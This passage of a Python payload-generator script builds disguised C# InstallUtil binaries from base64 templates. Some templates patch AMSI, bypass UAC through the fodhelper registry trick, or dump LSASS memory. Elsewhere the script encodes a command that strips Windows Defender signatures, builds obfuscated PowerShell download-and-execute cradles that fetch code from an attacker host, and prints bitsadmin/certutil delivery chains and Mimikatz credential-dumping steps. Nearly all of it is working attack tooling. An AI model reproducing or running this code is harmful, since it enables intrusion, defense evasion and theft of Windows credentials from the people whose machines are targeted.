            upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlczsKdXNpbmcgU3lzdGVtLlRleHQ7CnVzaW5nIFN5c3RlbS5Db25maWd1cmF0aW9uLkluc3RhbGw7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLlRocmVhZGluZzsKdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOwp1c2luZyBNaWNyb3NvZnQuV2luMzI7CgpuYW1lc3BhY2UgQnlwYXNzCnsKICAgIGNsYXNzIFByb2dyYW0KICAgIHsKICAgICAgICBzdGF0aWMgdm9pZCBNYWluKHN0cmluZ1tdIGFyZ3MpCiAgICAgICAgewogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiUHJlcGFyaW5nIHRvIGNvbmZpZ3VyZSBXaW5kb3dzLiBEbyBub3QgdHVybiBvZmYgeW91ciBjb21wdXRlci4iKTsKICAgICAgICB9CiAgICB9CgogICAgW1N5c3RlbS5Db21wb25lbnRNb2RlbC5SdW5JbnN0YWxsZXIodHJ1ZSldCiAgICBwdWJsaWMgY2xhc3MgU2FtcGxlIDogU3lzdGVtLkNvbmZpZ3VyYXRpb24uSW5zdGFsbC5JbnN0YWxsZXIKICAgIHsKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7CiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7CiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnQzMiBkd1NpemUsIFVJbnQzMiBmbE5ld1Byb3RlY3QsIG91dCBVSW50MzIgbHBmbE9sZFByb3RlY3QpOwogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIiwgRW50cnlQb2ludCA9ICJSdGxNb3ZlTWVtb3J5IiwgU2V0TGFzdEVycm9yID0gZmFsc2UpXQogICAgICAgIHN0YXRpYyBleHRlcm4gdm9pZCBNb3ZlTWVtb3J5KEludFB0ciBkZXN0LCBJbnRQdHIgc3JjLCBpbnQgc2l6ZSk7CiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICAgICAgc3RhdGljIGV4dGVybiB2b2lkIFNsZWVwKHVpbnQgZHdNaWxsaXNlY29uZHMpOwogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIEV4YWN0U3BlbGxpbmcgPSB0cnVlKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jRXhOdW1hKEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwQWRkcmVzcywgdWludCBkd1NpemUsIFVJbnQzMiBmbEFsbG9jYXRpb25UeXBlLCBVSW50MzIgZmxQcm90ZWN0LCBVSW50MzIgbm5kUHJlZmVycmVkKTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEN1cnJlbnRQcm9jZXNzKCk7CiAgICAgICAgcHVibGljIG92ZXJyaWRlIHZvaWQgVW5pbnN0YWxsKFN5c3RlbS5Db2xsZWN0aW9ucy5JRGljdGlvbmFyeSBzYXZlZFN0YXRlKQogICAgICAgIHsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlByZXBhcmluZyB0byBjb25maWd1cmUgV2luZG93cy4uLiBEbyBub3QgdHVybiBvZmYgeW91ciBjb21wdXRlci4iKTsKICAgICAgICAgICAgSW50UHRyIG1lbSA9IFZpcnR1YWxBbGxvY0V4TnVtYShHZXRDdXJyZW50UHJvY2VzcygpLCBJbnRQdHIuWmVybywgMHgxMDAwLCAweDMwMDAsIDB4NCwgMCk7CiAgICAgICAgICAgIGlmIChtZW0gPT0gbnVsbCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vd3JlY2sgbWltaQogICAgICAgICAgICBzdHJpbmcgbmFtZTEgPSAiYSIgKyAibXNpIiArICIuZGxsIjsKICAgICAgICAgICAgc3RyaW5nIG5hbWUyID0gIkEiICsgIm1zaSIgKyAiU2NhbkIiICsgInVmZmVyIjsKICAgICAgICAgICAgSW50UHRyIFRhcmdldERMTCA9IExvYWRMaWJyYXJ5KG5hbWUxKTsKICAgICAgICAgICAgSW50UHRyIE1pbWlQdHIgPSBHZXRQcm9jQWRkcmVzcyhUYXJnZXRETEwsIG5hbWUyKTsKICAgICAgICAgICAgVUludDMyIG9sZFByb3RlY3QgPSAwOwogICAgICAgICAgICBCeXRlW10gYnVmaSA9IHsgMHg0OCwgMHgzMSwgMHhDMCB9OwogICAgICAgICAgICBWaXJ0dWFsUHJvdGVjdChNaW1pUHRyLCAzLCAweDQwLCBvdXQgb2xkUHJvdGVjdCk7CiAgICAgICAgICAgIE1hcnNoYWwuQ29weShidWZpLCAwLCBNaW1pUHRyLCBidWZpLkxlbmd0aCk7CiAgICAgICAgICAgIFZpcnR1YWxQcm90ZWN0KE1pbWlQdHIsIDMsIDB4MjAsIG91dCBvbGRQcm90ZWN0KTsKCiAgICAgICAgICAgIC8vcnVuZGxsMzIgU0hFTEwzMi5ETEwsU2hlbGxFeGVjX1J1bkRMTCAiY21kIiAiL2MgcF5vXndeZV5yc15oXmVebGwuZXhlIGlleCgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoW2NoYXJbXV1AKDEwNCAsIDExNiAsMTE2ICwxMTIgLDU4LDQ3ICwgNDcsIDQ5ICw1NywgNTAsIDQ2LDQ5LCA1NCAsIDU2LDQ2ICw0OSAsNTEsNTMgLDQ2LCA1NSAsNDcsMTE0LDExNywgMTEwLCA0NiwgMTE2ICwgMTIwICwxMTYpKSkpIg=="
            lower = "ICAgICAgICAgICAgc3RyaW5nIGNvbW1hbmQgPSBFbmNvZGluZy5VVEY4LkdldFN0cmluZyhkYXRhKTsKCiAgICAgICAgICAgIFJlZ2lzdHJ5S2V5IG5ld2tleSA9IFJlZ2lzdHJ5LkN1cnJlbnRVc2VyLk9wZW5TdWJLZXkoQCJTb2Z0d2FyZVxDbGFzc2VzXCIsIHRydWUpOwogICAgICAgICAgICBuZXdrZXkuQ3JlYXRlU3ViS2V5KEAibXMtc2V0dGluZ3NcU2hlbGxcT3Blblxjb21tYW5kIik7CgogICAgICAgICAgICBSZWdpc3RyeUtleSBmb2QgPSBSZWdpc3RyeS5DdXJyZW50VXNlci5PcGVuU3ViS2V5KEAiU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVuXGNvbW1hbmQiLCB0cnVlKTsKICAgICAgICAgICAgZm9kLlNldFZhbHVlKCJEZWxlZ2F0ZUV4ZWN1dGUiLCAiIik7CiAgICAgICAgICAgIGZvZC5TZXRWYWx1ZSgiIiwgQGNvbW1hbmQpOwogICAgICAgICAgICBmb2QuQ2xvc2UoKTsKCiAgICAgICAgICAgIFByb2Nlc3MgcCA9IG5ldyBQcm9jZXNzKCk7CiAgICAgICAgICAgIHAuU3RhcnRJbmZvLldpbmRvd1N0eWxlID0gUHJvY2Vzc1dpbmRvd1N0eWxlLkhpZGRlbjsKICAgICAgICAgICAgcC5TdGFydEluZm8uRmlsZU5hbWUgPSAiQzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxmb2RoZWxwZXIuZXhlIjsKICAgICAgICAgICAgcC5TdGFydCgpOwoKICAgICAgICAgICAgVGhyZWFkLlNsZWVwKDEwMDAwKTsKCiAgICAgICAgICAgIG5ld2tleS5EZWxldGVTdWJLZXlUcmVlKCJtcy1zZXR0aW5ncyIpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIC8vTWVzc2FnZUJveChJbnRQdHIuWmVybywgY29tbWFuZC5Ub1N0cmluZygpLCAiVGhpcyBpcyBteSBjYXB0aW9uIiwgMCk7CiAgICAgICAgfQogICAgfQp9"

            cradle = "$wc = (new-object system.net.webclient);"
            if proxy_kill == "1":
                cradle += "$wc.proxy = $null;"
            if custom_agent == "1":
                cradle += "$wc.headers.add('User-Agent','%s');" % agent_string
            if proxy_steal == "1":
                cradle += "New-PSDrive -NAME HKU -PSProvider Registry -Root HKEY_USERS | Out-Null;$keys = gci \'HKU:\\\';ForEach ($key in $keys) {if ($key.Name -like \"*S-1-5-21-*\") {$start = $key.Name.substring(10);break}};$proxyAddr = (Get-ItemProperty -Path \"HKU:$start\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\\").ProxyServer;"
                cradle += "[system.net.webrequest]::DefaultWebProxy = new-object system.net.webproxy(\"http://$proxyAddr\");" #note: assuming proxy over http, not https
            cradle += "iex($wc.downloadstring('%s'))"

            #//rundll32 SHELL32.DLL,ShellExec_RunDLL "cmd" "/c p^o^w^e^rs^h^e^ll.exe iex((new-object net.webclient).downloadstring([System.Text.Encoding]::ASCII.GetString([char[]]@(104 , 116 ,116 ,112 ,58,47 , 47, 49 ,57, 50, 46,49, 54 , 56,46 ,49 ,51,53 ,46, 55 ,47,114,117, 110, 46, 116 , 120 ,116))))"
            runfilename = "run.txt"
            target = "http://%s/%s" % (lhost,runfilename)
            target = cradle % target
            #print (target)
            chars = chararray(target)
            chars = ", ".join(chars)

            base = "rundll32 SHELL32.DLL,ShellExec_RunDLL \"cmd\" \"/c p^o^w^e^rs^h^e^ll.exe iex([System.Text.Encoding]::ASCII.GetString([char[]]@(%s)))\""
            base = base % chars
            base_b64 = base64.b64encode(base.encode()).decode()
            #print (base)

            data = "byte[] data = Convert.FromBase64String(\"%s\");" % base_b64

            with open(rsfilename,'w') as f:
                upper = base64.b64decode(upper).decode()
                lower = base64.b64decode(lower).decode()
                f.write(upper + "\n")
                f.write("            " + data + "\n")
                f.write(lower)
            f.close()
        if binary == "MiniDump":
            upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlczsKdXNpbmcgU3lzdGVtLkNvbmZpZ3VyYXRpb24uSW5zdGFsbDsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5JTzsKCm5hbWVzcGFjZSBCeXBhc3MKewogICAgY2xhc3MgUHJvZ3JhbQogICAgewogICAgICAgIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykKICAgICAgICB7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJQcmVwYXJpbmcgdG8gY29uZmlndXJlIFdpbmRvd3MuLi4gRG8gbm90IHR1cm4gb2ZmIHlvdXIgY29tcHV0ZXIuIik7CiAgICAgICAgfQogICAgfQoKICAgIFtTeXN0ZW0uQ29tcG9uZW50TW9kZWwuUnVuSW5zdGFsbGVyKHRydWUpXQogICAgcHVibGljIGNsYXNzIFNhbXBsZSA6IFN5c3RlbS5Db25maWd1cmF0aW9uLkluc3RhbGwuSW5zdGFsbGVyCiAgICB7CiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG5hbWUpOwogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFByb2NBZGRyZXNzKEludFB0ciBoTW9kdWxlLCBzdHJpbmcgcHJvY05hbWUpOwogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgbHBBZGRyZXNzLCBVSW50MzIgZHdTaXplLCBVSW50MzIgZmxOZXdQcm90ZWN0LCBvdXQgVUludDMyIGxwZmxPbGRQcm90ZWN0KTsKICAgICAgICBbRGxsSW1wb3J0KCJEYmdoZWxwLmRsbCIpXQogICAgICAgIHN0YXRpYyBleHRlcm4gYm9vbCBNaW5pRHVtcFdyaXRlRHVtcChJbnRQdHIgaFByb2Nlc3MsIGludCBQcm9jZXNzSWQsIEludFB0ciBoRmlsZSwgaW50IER1bXBUeXBlLCBJbnRQdHIgRXhjZXB0aW9uUGFyYW0sIEludFB0ciBVc2VyU3RyZWFtUGFyYW0sIEludFB0ciBDYWxsYmFja1BhcmFtKTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgRXhhY3RTcGVsbGluZyA9IHRydWUpXQogICAgICAgIHN0YXRpYyBleHRlcm4gSW50UHRyIE9wZW5Qcm9jZXNzKHVpbnQgcHJvY2Vzc0FjY2VzcywgYm9vbCBiSW5oZXJpdEhhbmRsZSwgaW50IHByb2Nlc3NJZCk7CiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgRXhhY3RTcGVsbGluZyA9IHRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBWaXJ0dWFsQWxsb2NFeE51bWEoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgVUludDMyIGZsQWxsb2NhdGlvblR5cGUsIFVJbnQzMiBmbFByb3RlY3QsIFVJbnQzMiBubmRQcmVmZXJyZWQpOwoKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0Q3VycmVudFByb2Nlc3MoKTsKICAgICAgICBwdWJsaWMgb3ZlcnJpZGUgdm9pZCBVbmluc3RhbGwoU3lzdGVtLkNvbGxlY3Rpb25zLklEaWN0aW9uYXJ5IHNhdmVkU3RhdGUpCiAgICAgICAgewogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiUHJlcGFyaW5nIHRvIGNvbmZpZ3VyZSBXaW5kb3dzLi4uIERvIG5vdCB0dXJuIG9mZiB5b3VyIGNvbXB1dGVyLiIpOwogICAgICAgICAgICBJbnRQdHIgbWVtID0gVmlydHVhbEFsbG9jRXhOdW1hKEdldEN1cnJlbnRQcm9jZXNzKCksIEludFB0ci5aZXJvLCAweDEwMDAsIDB4MzAwMCwgMHg0LCAwKTsKICAgICAgICAgICAgaWYgKG1lbSA9PSBudWxsKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLy93cmVjayBtaW1pCiAgICAgICAgICAgIHN0cmluZyBuYW1lMSA9ICJhIiArICJtc2kiICsgIi5kbGwiOwogICAgICAgICAgICBzdHJpbmcgbmFtZTIgPSAiQSIgKyAibXNpIiArICJTY2FuQiIgKyAidWZmZXIiOwogICAgICAgICAgICBJbnRQdHIgVGFyZ2V0RExMID0gTG9hZExpYnJhcnkobmFtZTEpOwogICAgICAgICAgICBJbnRQdHIgTWltaVB0ciA9IEdldFByb2NBZGRyZXNzKFRhcmdldERMTCwgbmFtZTIpOwogICAgICAgICAgICBVSW50MzIgb2xkUHJvdGVjdCA9IDA7CiAgICAgICAgICAgIEJ5dGVbXSBidWZpID0geyAweDQ4LCAweDMxLCAweEMwIH07CiAgICAgICAgICAgIFZpcnR1YWxQcm90ZWN0KE1pbWlQdHIsIDMsIDB4NDAsIG91dCBvbGRQcm90ZWN0KTsKICAgICAgICAgICAgTWFyc2hhbC5Db3B5KGJ1ZmksIDAsIE1pbWlQdHIsIGJ1ZmkuTGVuZ3RoKTsKICAgICAgICAgICAgVmlydHVhbFByb3RlY3QoTWltaVB0ciwgMywgMHgyMCwgb3V0IG9sZFByb3RlY3QpOw=="
            lower = "ICAgICAgICAgICAgUHJvY2Vzc1tdIGxzYXNzID0gUHJvY2Vzcy5HZXRQcm9jZXNzZXNCeU5hbWUoImxzYXNzIik7CiAgICAgICAgICAgIGludCBsc2Fzc19waWQgPSBsc2Fzc1swXS5JZDsKCiAgICAgICAgICAgIEludFB0ciBoUHJvY2VzcyA9IE9wZW5Qcm9jZXNzKDB4MDAxRjBGRkYsIGZhbHNlLCBsc2Fzc19waWQpOwogICAgICAgICAgICBib29sIGR1bXBlZCA9IE1pbmlEdW1wV3JpdGVEdW1wKGhQcm9jZXNzLCBsc2Fzc19waWQsIGR1bXBGaWxlLlNhZmVGaWxlSGFuZGxlLkRhbmdlcm91c0dldEhhbmRsZSgpLCAyLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8sIEludFB0ci5aZXJvKTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlByZXBhcmluZyB0byB1cGRhdGUgV2luZG93cy4uLiBEbyBub3QgdHVybiBvZmYgeW91ciBjb21wdXRlci4iKTsKICAgICAgICB9CiAgICB9Cn0="
        
            dumppath = "c:\\windows\\tasks\\"
            dumpfile = "lsass.dmp"
            dumpfilepath = dumppath + dumpfile
            dumpfilepath = dumpfilepath.replace('\\','\\\\') #prep for conversion to csharp

            data = "FileStream dumpFile = new FileStream(\"%s\", FileMode.Create);" % (dumpfilepath)

            with open(rsfilename,'w') as f:
                upper = base64.b64decode(upper).decode()
                lower = base64.b64decode(lower).decode()
                f.write(upper + "\n")
                f.write("            " + data + "\n")
                f.write(lower)
            f.close()

            print('[!] MiniDump chosen! Run with Admin only! Post-usage instructions:')
            print('[*] check dump:\ndir %s\nls %s' % ((dumppath + dumpfile),dumpfilepath))
            print('[*] dump lsass (on windows!):\ndownload %s\ncp lsass.dmp /var/www/html/\nwget -uri http://%s/lsass.dmp -OutFile C:\\tools\\lsass.dmp\niex(new-object net.webclient).downloadstring(\'http://%s/kiwi.txt\')\nInvoke-Mimikatz -Command "`"sekurlsa::minidump c:\\tools\\lsass.dmp`" sekurlsa::logonpasswords" > c:\\tools\\dump.txt\ntype c:\\tools\\dump.txt' % (dumpfilepath,devhost,devhost))
        pass 

    if binary == "0":
        upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlczsKdXNpbmcgU3lzdGVtLlRleHQ7CnVzaW5nIFN5c3RlbS5Db25maWd1cmF0aW9uLkluc3RhbGw7CgpuYW1lc3BhY2UgQnlwYXNzCnsKICAgIGNsYXNzIFByb2dyYW0KICAgIHsKICAgICAgICBzdGF0aWMgdm9pZCBNYWluKHN0cmluZ1tdIGFyZ3MpCiAgICAgICAgewogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiUHJlcGFyaW5nIHRvIGNvbmZpZ3VyZSBXaW5kb3dzLiBEbyBub3QgdHVybiBvZmYgeW91ciBjb21wdXRlci4iKTsKICAgICAgICB9CiAgICB9CgogICAgW1N5c3RlbS5Db21wb25lbnRNb2RlbC5SdW5JbnN0YWxsZXIodHJ1ZSldCiAgICBwdWJsaWMgY2xhc3MgU2FtcGxlIDogU3lzdGVtLkNvbmZpZ3VyYXRpb24uSW5zdGFsbC5JbnN0YWxsZXIKICAgIHsKICAgICAgICBwdWJsaWMgb3ZlcnJpZGUgdm9pZCBVbmluc3RhbGwoU3lzdGVtLkNvbGxlY3Rpb25zLklEaWN0aW9uYXJ5IHNhdmVkU3RhdGUpCiAgICAgICAgew=="
        lower = "ICAgICAgICAgICAgc3RyaW5nIGNvbW1hbmQgPSBFbmNvZGluZy5VVEY4LkdldFN0cmluZyhkYXRhKTsKCiAgICAgICAgICAgIFJ1bnNwYWNlIHJzID0gUnVuc3BhY2VGYWN0b3J5LkNyZWF0ZVJ1bnNwYWNlKCk7CiAgICAgICAgICAgIHJzLk9wZW4oKTsKICAgICAgICAgICAgUG93ZXJTaGVsbCBwcyA9IFBvd2VyU2hlbGwuQ3JlYXRlKCk7CiAgICAgICAgICAgIHBzLlJ1bnNwYWNlID0gcnM7CiAgICAgICAgICAgIHBzLkFkZFNjcmlwdChjb21tYW5kKTsKICAgICAgICAgICAgcHMuSW52b2tlKCk7CiAgICAgICAgICAgIHJzLkNsb3NlKCk7CiAgICAgICAgfQogICAgfQp9"

        if ptype == "ps1":
            if pscmd == "0":
                runfilename = "run.txt"
                runner(lhost,lport,bitness)
                fcradle,cradle = cradleps1(lhost,runfilename)
            else:
                print('[+] pscmd: %s' % pscmd)
        if ptype == "dll":
            runfilename = "ClassLibrary1.dll"
            runwebroot = "/var/www/html/"
            if uacbypass == "0":
                gen(lhost,lport,bitness,"csharp")
            if uacbypass == "1":
                runner(lhost,lport,bitness)
            csfilename = writedll(lhost,lport,bitness,uacbypass)
            csfilepath = "/home/kali/data/ClassLibrary1/ClassLibrary1/"
            copy(csfilename,csfilepath,csfilename)
            input("[!] build %s with bitness %s .. press enter to continue\n" % (csfilename,bitness))
            if bitness == "64":
                copy("%sbin/x64/Release/%s" % (csfilepath,runfilename),runwebroot,runfilename)
            if bitness == "32":
                copy("%sbin/x86/Release/%s" % (csfilepath,runfilename),runwebroot,runfilename)
            fcradle,cradle = cradledll(lhost,runfilename)

        amsi = "JGE9W1JlZl0uQXNzZW1ibHkuR2V0VHlwZXMoKTtGb3JFYWNoKCRiIGluICRhKSB7aWYgKCRiLk5hbWUgLWxpa2UgJyppVXRpbHMnKSB7JGM9JGJ9fTskZD0kYy5HZXRGaWVsZHMoJ05vblB1YmxpYyxTdGF0aWMnKTtGb3JFYWNoKCRlIGluICRkKSB7aWYgKCRlLk5hbWUgLWxpa2UgJypDb250ZXh0JykgeyRmPSRlfX07JGc9JGYuR2V0VmFsdWUoJG51bGwpO1tJbnRQdHJdJHB0cj0kZztbSW50MzJbXV0kYnVmPUAoMCk7W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkYnVmLCAwLCAkcHRyLCAxKQ=="
        defkill = "c3RhcnQtcHJvY2VzcyBwb3dlcnNoZWxsLmV4ZSAtYXJndW1lbnRsaXN0ICJ3aGlsZSgxKXsmICdDOlxQcm9ncmFtIEZpbGVzXFdpbmRvd3MgRGVmZW5kZXJcTXBDbWRSdW4uZXhlJyAtUmVtb3ZlRGVmaW5pdGlvbnMgLUFsbDtzdGFydC1zbGVlcCAtc2Vjb25kcyAzMDB9IiAtd2luZG93c3R5bGUgaGlkZGVuCgomICdDOlxQcm9ncmFtIEZpbGVzXFdpbmRvd3MgRGVmZW5kZXJcTXBDbWRSdW4uZXhlJyAtUmVtb3ZlRGVmaW5pdGlvbnMgLUFsbA=="
        
        if direct == "0":
            target = "http://%s/%s" % (lhost,runfilename)
            target = cradle % target
            target = base64.b64decode(amsi).decode() + ";" + target
        if direct == "1":
            if pscmd == "0":
                target,target_b64 = makeoneliner(runfilename)
            else:
                if pscmd[-4:] == ".ps1" or pscmd[-4:] == ".txt":
                    target,target_b64 = makeoneliner(pscmd)
                    pass
                else:
                    target = base64.b64decode(amsi).decode() + ";" + base64.b64decode(defkill).decode() + ";" + pscmd
            pass
        #print (target)
        chars = chararray(target)
        chars = ", ".join(chars)

        base = "iex([System.Text.Encoding]::ASCII.GetString([char[]]@(%s)))"
        base = base % chars
        base_b64 = base64.b64encode(base.encode()).decode()
        #print(base)

        data = "byte[] data = Convert.FromBase64String(\"%s\");" % base_b64

        with open(rsfilename,'w') as f:
            upper = base64.b64decode(upper).decode()
            lower = base64.b64decode(lower).decode()
            f.write(upper + "\n")
            f.write("\t\t\t" + data + "\n")
            f.write(lower)
        f.close()

    print('[+] runspace cs written: %s' % rsfilename)
    if binary != "0":
        base_b64 = "[!] woops! not relevant for makerunspace with -b binary!"
    return rsfilename,base_b64
    pass

def chunkstring(string, length):
    return (string[0+i:length+i] for i in range(0, len(string), length))

def certutil_b64encode(exefilename):
    head = "-----BEGIN CERTIFICATE-----\n"
    tail = "-----END CERTIFICATE-----"

    e = open(exefilename,'rb')
    exebytes = e.read()
    e.close()
    exebytes_b64 = base64.b64encode(exebytes).decode()
    exebytes_b64chunks = list(chunkstring(exebytes_b64,64))

    certfilename = "file.txt"
    with open(certfilename,'w') as f:
        f.write(head)
        for chunk in exebytes_b64chunks:
            f.write(chunk + "\n")
        f.write(tail)
    f.close()
    print('[+] certutil encoded file written: %s' % certfilename)
    return certfilename
    #print(exebytes_b64chunks)
    pass

def makerunspace(bitness,lhost,lport,ptype,uacbypass,direct,pscmd,binary,targethost,listenhost,pipename):
    bitsjobname = rand_word()
    randtxtname = "%s.txt" % rand_word()
    randexename = "%s.exe" % rand_word()    
    rsfilename,cmdstring_b64 = writerunspace(lhost,lport,ptype,bitness,uacbypass,direct,pscmd,binary,targethost,listenhost,pipename)
    rsfilepath = "/home/kali/data/Runspace/Runspace/"
    exefilename = "Runspace.exe"
    exewebroot = "/var/www/html/"
    loadpath_met = "c:\\\\windows\\\\tasks\\\\%s"
    loadpath_cmd = loadpath_met.replace("\\\\","\\")
    utilpath = 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U %s'
    certutilcombo = "bitsadmin /Transfer %s http://%s/%s %s && certutil -decode %s %s"
    if custom_agent == "0":
        certutilcombo_sub = "bitsadmin /Transfer %s http://%s/%s %s && del %s && certutil -decode %s %s"
    if custom_agent == "1":
        certutilcombo_sub = "bitsadmin /create /download %s && bitsadmin /setcustomheaders %s User-Agent:\"%s\" && bitsadmin /addFile %s http://%s/%s %s && bitsadmin /resume %s && ping 127.0.0.1 -n 10 > nul && bitsadmin /complete %s && del %s && certutil -decode %s %s"
    if proxy_steal == "1":
        certutilcombo_sub = "bitsadmin /util /setieproxy localsystem AUTODETECT && " + certutilcombo_sub

    copy(rsfilename,rsfilepath,"Program.cs")
    input("[!] build %s with bitness %s .. press enter to continue\n" % (rsfilename,bitness))
    if bitness == "64":
        copy("%sbin/x64/Release/%s" % (rsfilepath,exefilename),exewebroot,exefilename)
    if bitness == "32":
        copy("%sbin/x86/Release/%s" % (rsfilepath,exefilename),exewebroot,exefilename)
    
    certfilename = certutil_b64encode(exewebroot+exefilename)
    certfilepath_met = loadpath_met % randtxtname #certfilename
    certfilepath_cmd = loadpath_cmd % randtxtname #certfilename
    exefileroot = exewebroot + exefilename
    exefilepath_met = loadpath_met % randexename #exefilename
    exefilepath_cmd = loadpath_cmd % randexename #exefilename

    combo_one = certutilcombo % (bitsjobname,lhost,certfilename,certfilepath_cmd,certfilepath_cmd,exefilepath_cmd)
    if custom_agent == "0":
        combo_one_sub = certutilcombo_sub % (bitsjobname,lhost,certfilename,certfilepath_cmd,exefilepath_cmd,certfilepath_cmd,exefilepath_cmd)
    if custom_agent == "1":
        combo_one_sub = certutilcombo_sub % (bitsjobname,bitsjobname,agent_string,bitsjobname,lhost,certfilename,certfilepath_cmd,bitsjobname,bitsjobname,exefilepath_cmd,certfilepath_cmd,exefilepath_cmd)
    combo_two = utilpath % (exefilepath_cmd)
    combo_break = combo_one + " && " + combo_two
    combo_break_sub = combo_one_sub + " && " + combo_two

    copy(certfilename,exewebroot,certfilename)
    print('[*] upload:\nupload %s %s' % (exefileroot,exefilepath_met)) 
    print(combo_one)
    print(combo_one_sub)
    print('[*] check:\ndir %s\ntype %s' % (exefilepath_cmd,exefilepath_cmd))
    print('[*] use:\n%s ' % (combo_two))
    #print('[*] base64:\npowershell -enc %s' % (powershell_b64encode(combo_two)))
    #print('[!] c-c-c-combo breaker (cmd only!):\n%s' % combo_break) # not really needed - just del exe regardless
    print('[!] c-c-c-combo breaker (cmd only!) (sub):\n%s' % combo_break_sub)
    # won't work in powershell - command is for cmd only! (with the "&&")
    #print('[!] c-c-c-combo breaker base64:\npowershell -enc %s' % (powershell_b64encode(combo_break)))
    #print('[!] c-c-c-combo breaker base64 (sub):\npowershell -enc %s' % (powershell_b64encode(combo_break_sub)))
    return combo_break,combo_break_sub
    pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--type','-t',required=False,dest='ptype',help='ps1 or dll')
    parser.add_argument('--uac','-u',required=False,dest='uacbypass',help='uacbypass 0 or 1, only use with dll!')
    parser.add_argument('--direct','-d',required=False,dest='direct',help='direct 0 or 1, only use with ps1!')
